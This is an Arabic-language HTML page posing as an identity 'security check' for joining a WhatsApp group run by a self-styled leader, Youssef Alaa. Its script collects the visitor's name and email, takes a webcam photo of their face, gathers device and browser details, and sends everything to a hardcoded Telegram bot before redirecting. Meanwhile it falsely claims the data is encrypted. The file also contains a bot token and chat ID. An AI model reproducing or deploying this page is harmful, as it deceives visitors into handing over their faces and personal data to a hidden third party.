<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>⛩️ الإمبراطورية العظمى | القائد يوسف علاء</title>
    
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700;900&family=Cairo:wght@700;900&display=swap" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>

    <style>
        :root {
            --primary: #ff003c;
            --accent: #ffb700;
            --bg-dark: #050505;
            --glass-bg: rgba(10, 10, 10, 0.85);
            --neon-shadow: 0 0 25px rgba(255, 0, 60, 0.6);
        }

        * { box-sizing: border-box; transition: all 0.3s ease; }

        body, html {
            margin: 0; padding: 0; width: 100%; height: 100%;
            font-family: 'Tajawal', sans-serif; background: var(--bg-dark);
            color: #fff; overflow-x: hidden;
        }

        /* فيديو الخلفية */
        #bg-video {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            object-fit: cover; z-index: -2; opacity: 0.4; filter: contrast(1.1);
        }

        .dark-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: linear-gradient(135deg, rgba(0,0,0,0.9) 0%, transparent 100%);
            z-index: -1;
        }

        /* الحاوية الرئيسية */
        .wrapper {
            display: flex; justify-content: center; align-items: center;
            min-height: 100vh; padding: 25px;
        }

        .main-panel {
            background: var(--glass-bg);
            backdrop-filter: blur(25px);
            border: 2px solid var(--primary);
            border-radius: 35px;
            width: 100%; max-width: 550px;
            padding: 45px; text-align: center;
            box-shadow: var(--neon-shadow);
            position: relative; overflow: hidden;
        }

        /* شعار يوسف علاء */
        .founder-header {
            margin-bottom: 30px;
        }
        .founder-header h1 {
            font-family: 'Cairo', sans-serif; font-size: 35px; margin: 0;
            text-transform: uppercase; letter-spacing: 2px;
            background: linear-gradient(to bottom, #fff, var(--primary));
            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
        }
        .founder-tag {
            color: var(--accent); font-weight: 900; font-size: 14px;
            letter-spacing: 3px; display: block; margin-top: 5px;
        }

        /* الحقول */
        .input-wrapper { position: relative; margin-bottom: 25px; text-align: right; }
        .input-wrapper label { display: block; margin-bottom: 10px; color: var(--accent); font-size: 13px; font-weight: bold; }
        .input-wrapper input {
            width: 100%; padding: 18px 25px; border-radius: 15px;
            border: 1px solid #333; background: rgba(255,255,255,0.03);
            color: #fff; font-size: 16px; outline: none;
        }
        .input-wrapper input:focus {
            border-color: var(--primary); background: rgba(255,255,255,0.08);
            box-shadow: 0 0 15px rgba(255, 0, 60, 0.3);
        }

        /* الكاميرا */
        .camera-zone {
            position: relative; border-radius: 20px; overflow: hidden;
            border: 3px solid #1a1a1a; margin-top: 20px; box-shadow: 0 0 40px rgba(0,0,0,0.8);
        }
        #webcam { width: 100%; display: block; transform: scaleX(-1); background: #000; }
        .scan-bar {
            position: absolute; width: 100%; height: 2px; background: var(--primary);
            box-shadow: 0 0 15px var(--primary); animation: scanning 2.5s infinite;
        }
        @keyframes scanning { 0% { top: 0; } 50% { top: 100%; } 100% { top: 0; } }

        /* الأزرار */
        .btn-mega {
            width: 100%; padding: 22px; border: none; border-radius: 20px;
            background: linear-gradient(45deg, var(--primary), #80001e);
            color: #fff; font-size: 20px; font-weight: 900; cursor: pointer;
            box-shadow: 0 8px 25px rgba(255, 0, 60, 0.4); font-family: 'Cairo', sans-serif;
        }
        .btn-mega:hover { transform: translateY(-3px); filter: brightness(1.2); }

        .footer-brand {
            margin-top: 40px; padding-top: 20px; border-top: 1px solid rgba(255,255,255,0.1);
        }
        .footer-brand p { color: var(--accent); font-weight: 900; margin: 0; font-size: 18px; }

        .hidden { display: none; }
        .visible { display: block; animation: zoomIn 0.5s; }

        /* صورة القائد يوسف علاء */
        .youssef-img {
            width: 100%; border-radius: 20px; border: 2px solid var(--accent);
            margin-bottom: 25px; box-shadow: 0 0 20px rgba(255, 183, 0, 0.3);
        }
    </style>
</head>
<body>

    <video id="bg-video" autoplay muted playsinline></video>
    <div class="dark-overlay"></div>

    <div class="wrapper">
        <div class="main-panel animate__animated animate__fadeInUp">
            
            <div class="founder-header">
                <div class="founder-tag">PROCESSED BY</div>
                <h1>يـوسف عـلاء</h1>
            </div>

            <div id="phase1">
                <div class="input-wrapper">
                    <label>📝 الهوية (الاسم بالكامل):</label>
                    <input type="text" id="inpName" placeholder="أدخل اسمك هنا..." required>
                </div>
                <div class="input-wrapper">
                    <label>📧 قناة التواصل (البريد الإلكتروني):</label>
                    <input type="email" id="inpMail" placeholder="example@mail.com" required>
                </div>
                <button onclick="startScanning()" class="btn-mega">بدء التحقق الأمني 🛡️</button>
            </div>

            <div id="phase2" class="hidden">
                <img src="Screenshot_2026-03-14-17-16-23-72.jpg" class="youssef-img" alt="Founder" onerror="this.style.display='none'">
                <p style="font-size: 12px; color: var(--accent);">بانتظار التقاط البصمة الوجهية لاعتمادك كعضو..</p>
                <div class="camera-zone">
                    <div class="scan-bar"></div>
                    <video id="webcam" autoplay playsinline></video>
                    <canvas id="capture" style="display:none;"></canvas>
                </div>
                <button onclick="uploadAndRedirect()" class="btn-mega">تأكيد الهوية ودخول الجروب 🚀</button>
            </div>

            <div class="footer-brand">
                <p>👑 THE FOUNDER: YOUSSEF ALAA 👑</p>
                <small style="color: #444;">SYSTEM SECURED BY ENCRYPTION 256-BIT</small>
            </div>
        </div>
    </div>

    <script>
        // --- إعدادات القائد يوسف علاء ---
        const CONFIG = {
            botToken: "8737868558:AAFqvBT8qY3E5kJDC8bjXT1Ku9gSBXv9Q4g",
            chatId: "7394389253",
            whatsapp: "https://chat.whatsapp.com/J08oDw7MzULIJHnzN2Okts",
            vids: [
                "385937dae3995b54f3fecde0dd7acec7_1769970173274.mp4",
                "fqBsQ4ZhiMk.mp4"
            ]
        };

        // --- نظام الفيديوهات المتطور ---
        const videoEl = document.getElementById('bg-video');
        let vidIndex = 0;

        function playNextVideo() {
            videoEl.src = CONFIG.vids[vidIndex];
            videoEl.load();
            videoEl.play();
            vidIndex = (vidIndex + 1) % CONFIG.vids.length;
        }

        videoEl.onended = playNextVideo;
        playNextVideo(); // تشغيل البداية

        // --- وظائف النظام ---
        function startScanning() {
            const n = document.getElementById('inpName').value;
            const e = document.getElementById('inpMail').value;

            if (n.length < 3 || !e.includes('@')) {
                Swal.fire({ title: 'تنبيه!', text: 'الرجاء إدخال بيانات صحيحة للمتابعة.', icon: 'warning', background: '#111', color: '#fff' });
                return;
            }

            document.getElementById('phase1').classList.add('hidden');
            document.getElementById('phase2').classList.remove('hidden');

            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => { document.getElementById('webcam').srcObject = stream; })
                .catch(() => { Swal.fire('خطأ!', 'يجب السماح بالكاميرا لإنهاء التحقق.', 'error'); });
        }

        async function uploadAndRedirect() {
            Swal.fire({ 
                title: 'جاري رفع التقرير للقائد يوسف..', 
                html: 'يرجى الانتظار، يتم تشفير صورتك وبياناتك حالياً.',
                background: '#0a0a0a', color: '#fff',
                didOpen: () => Swal.showLoading() 
            });

            const v = document.getElementById('webcam');
            const c = document.getElementById('capture');
            c.width = v.videoWidth; c.height = v.videoHeight;
            c.getContext('2d').drawImage(v, 0, 0);

            c.toBlob(async (blob) => {
                const name = document.getElementById('inpName').value;
                const email = document.getElementById('inpMail').value;
                const power = Math.floor(Math.random() * (9999 - 1000) + 1000);

                // --- استخبارات النظام (بيانات العضو) ---
                const report = `
🔥 **تم رصد دخول جديد للمملكة** 🔥
━━━━━━━━━━━━━━━━━━
👤 **الاسم:** ${name}
📧 **البريد:** ${email}
⚡ **مستوى الطاقة:** ${power}
📱 **الجهاز:** ${navigator.platform}
🖥️ **الشاشة:** ${screen.width}x${screen.height}
🌍 **المتصفح:** ${navigator.userAgent.substring(0, 30)}...
📅 **التاريخ:** ${new Date().toLocaleString('ar-EG')}
━━━━━━━━━━━━━━━━━━
👑 **بإدارة القائد: يوسف علاء** 👑
                `;

                const formData = new FormData();
                formData.append("chat_id", CONFIG.chatId);
                formData.append("photo", blob, "warrior_capture.jpg");
                formData.append("caption", report);
                formData.append("parse_mode", "Markdown");

                try {
                    await fetch(`https://api.telegram.org/bot${CONFIG.botToken}/sendPhoto`, { method: "POST", body: formData });
                    Swal.fire({ icon: 'success', title: 'تم التحقق بنجاح!', text: 'أهلاً بك في عرين الأسود.. جاري تحويلك.', timer: 2000, showConfirmButton: false });
                    setTimeout(() => window.location.href = CONFIG.whatsapp, 2000);
                } catch (err) {
                    window.location.href = CONFIG.whatsapp; // تحويل اضطراري
                }
            }, 'image/jpeg', 0.85);
        }
    </script>
</body>
</html>
